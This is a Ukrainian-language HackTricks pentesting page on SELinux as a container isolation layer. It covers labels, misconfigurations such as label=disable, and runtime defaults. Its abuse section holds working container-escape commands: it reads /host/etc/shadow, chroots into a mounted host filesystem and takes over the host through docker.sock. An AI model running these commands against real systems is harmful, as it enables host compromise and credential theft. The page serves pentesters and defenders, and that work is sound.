# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

SELinux — це система **Mandatory Access Control на основі міток**. Кожен відповідний процес і об'єкт може мати контекст безпеки, а policy визначає, які domains можуть взаємодіяти з якими types і яким чином. У containerized environments це зазвичай означає, що runtime запускає процес контейнера в обмеженому container domain і позначає вміст контейнера відповідними types. Якщо policy працює належним чином, процес може читати й записувати об'єкти, яких очікує торкатися його мітка, але отримує відмову в доступі до іншого вмісту хоста, навіть якщо цей вміст стає видимим через mount.

Це один із найпотужніших доступних захистів на стороні хоста в основних Linux container deployments. Він особливо важливий у Fedora, RHEL, CentOS Stream, OpenShift та інших екосистемах, орієнтованих на SELinux. У таких середовищах reviewer, який ігнорує SELinux, часто неправильно розуміє, чому шлях до компрометації хоста, що здається очевидним, насправді заблокований.

## AppArmor Vs SELinux

Найпростіша загальна відмінність полягає в тому, що AppArmor базується на шляхах, тоді як SELinux є **системою на основі міток**. Це має значні наслідки для container security. Policy на основі шляхів може поводитися інакше, якщо той самий вміст хоста стає доступним за неочікуваним шляхом mount. Policy на основі міток натомість перевіряє, якою є мітка об'єкта і що domain процесу дозволено з ним робити. Це не робить SELinux простим, але робить його стійким до певного класу припущень щодо маніпуляцій зі шляхами, які defenders іноді помилково роблять у системах на основі AppArmor.

Оскільки ця модель орієнтована на мітки, обробка container volumes і рішення щодо relabeling є критичними для безпеки. Якщо runtime або оператор змінює мітки надто широко, щоб «змусити mounts працювати», межа policy, яка мала ізолювати workload, може стати значно слабшою, ніж передбачалося.

## Лабораторна робота

Щоб перевірити, чи активний SELinux на хості:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Щоб перевірити наявні мітки на хості:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Щоб порівняти звичайний запуск із запуском, у якому маркування вимкнено:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
На хості з увімкненим SELinux це дуже практична демонстрація, оскільки вона показує різницю між workload, що працює в очікуваному container domain, і workload, у якого цей рівень enforcement було вилучено.

## Використання під час виконання

Podman особливо добре узгоджується з SELinux у системах, де SELinux є частиною стандартної платформи. Rootless Podman разом із SELinux є одним із найнадійніших загальноприйнятих baseline для контейнерів, оскільки процес уже є непривілейованим на боці хоста й водночас обмежується політикою MAC. Docker також може використовувати SELinux, якщо це підтримується, хоча адміністратори іноді вимикають його, щоб обійти проблеми з маркуванням volume. CRI-O та OpenShift значною мірою покладаються на SELinux як на частину своєї моделі ізоляції контейнерів. Kubernetes також може надавати налаштування, пов’язані із SELinux, але їхня цінність, очевидно, залежить від того, чи операційна система node фактично підтримує та застосовує SELinux.<sup>[[2]](#references)</sup>

Основний висновок полягає в тому, що SELinux — це не необов’язкове доповнення. В екосистемах, побудованих навколо нього, він є частиною очікуваної межі безпеки.

## Неправильні налаштування

Класична помилка — `label=disable`. На практиці це часто трапляється через те, що монтування volume було заборонено, а найшвидшим короткостроковим рішенням стало усунення SELinux із рівняння замість виправлення моделі маркування.<sup>[[1]](#references)</sup> Інша поширена помилка — неправильне перемаркування вмісту хоста. Масштабні операції перемаркування можуть забезпечити роботу застосунку, але також можуть значно розширити доступ контейнера до об’єктів, перевищивши початково запланований обсяг.

Також важливо не плутати **встановлений** SELinux із **фактично застосовуваним** SELinux. Хост може підтримувати SELinux і водночас працювати в permissive mode, або runtime може запускати workload не в очікуваному domain. У таких випадках захист значно слабший, ніж можна припустити з документації.

## Зловживання

Коли SELinux відсутній, працює в permissive mode або широко вимкнений для workload, змонтовані шляхи хоста стає значно легше використовувати для зловживань. Те саме bind mount, яке інакше було б обмежене labels, може перетворитися на прямий шлях до даних хоста або до його модифікації. Це особливо важливо в поєднанні з доступними для запису volume mounts, директоріями container runtime або операційними спрощеннями, які задля зручності відкривають доступ до чутливих шляхів хоста.

SELinux часто пояснює, чому типовий breakout writeup одразу спрацьовує на одному хості, але неодноразово зазнає невдачі на іншому, хоча flags runtime виглядають подібно. Відсутнім компонентом часто є не namespace і не capability, а межа labels, яка залишилася непорушеною.

Найшвидша практична перевірка — порівняти активний context, а потім перевірити змонтовані шляхи хоста або директорії runtime, які зазвичай були б обмежені labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Якщо присутнє host bind mount, а SELinux labeling вимкнено або послаблено, витік інформації часто є першим наслідком:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Якщо монтування доступне для запису, а з погляду ядра контейнер фактично має права host-root, наступним кроком є перевірка контрольованої модифікації хоста замість здогадок:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
На хостах із підтримкою SELinux втрата міток у каталогах стану runtime також може відкрити прямі шляхи до privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Ці команди не замінюють повний escape chain, але дуже швидко показують, чи саме SELinux перешкоджав доступу до даних host або зміні файлів на host.

### Повний приклад: SELinux вимкнено + доступний для запису mount host

Якщо SELinux labeling вимкнено, а файлова система host змонтована з доступом на запис у `/host`, повний host escape стає звичайним випадком зловживання bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо `chroot` завершується успішно, процес контейнера тепер працює з файлової системи хоста:
```bash
id
hostname
cat /etc/passwd | tail
```
### Повний приклад: SELinux вимкнено + каталог runtime

Якщо workload може отримати доступ до runtime socket після вимкнення labels, escape можна делегувати runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Важливе спостереження полягає в тому, що SELinux часто був механізмом контролю, який запобігав саме такому доступу до шляхів хоста або стану середовища виконання.

## Перевірки

Мета перевірок SELinux — підтвердити, що SELinux увімкнено, визначити поточний контекст безпеки та перевірити, чи файли або шляхи, які вас цікавлять, справді обмежені за мітками.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Що тут важливо:

- `getenforce` в ідеалі має повертати `Enforcing`; `Permissive` або `Disabled` змінює значення всього розділу SELinux.
- Якщо контекст поточного процесу виглядає неочікуваним або надто широким, workload може працювати не за призначеною container policy.
- Якщо файли, змонтовані з хоста, або runtime directories мають labels, до яких процес може отримувати надто вільний доступ, bind mounts стають значно небезпечнішими.

Під час перевірки контейнера на платформі з підтримкою SELinux не вважайте labeling другорядною деталлю. У багатьох випадках це одна з головних причин, чому host ще не було скомпрометовано.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Залежить від host | SELinux separation доступна на hosts із підтримкою SELinux, але точна поведінка залежить від конфігурації host/daemon | `--security-opt label=disable`, broad relabeling bind mounts, `--privileged` |
| Podman | Зазвичай увімкнено на SELinux hosts | SELinux separation є стандартною частиною Podman у SELinux-системах, якщо її не вимкнено | `--security-opt label=disable`, `label=false` у `containers.conf`, `--privileged` |
| Kubernetes | Зазвичай не призначається автоматично на рівні Pod | Підтримка SELinux існує, але Pods зазвичай потребують `securityContext.seLinuxOptions` або platform-specific defaults; потрібна підтримка runtime та node | weak або broad `seLinuxOptions`, запуск на permissive/disabled nodes, platform policies, що вимикають labeling |
| CRI-O / OpenShift style deployments | Часто активно використовується | SELinux часто є основною частиною моделі ізоляції node у цих середовищах | custom policies, які надмірно розширюють доступ, вимкнення labeling для сумісності |

SELinux defaults більше залежать від дистрибутива, ніж seccomp defaults. У системах на кшталт Fedora/RHEL/OpenShift SELinux часто є центральним елементом моделі ізоляції. У системах без SELinux він просто відсутній.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
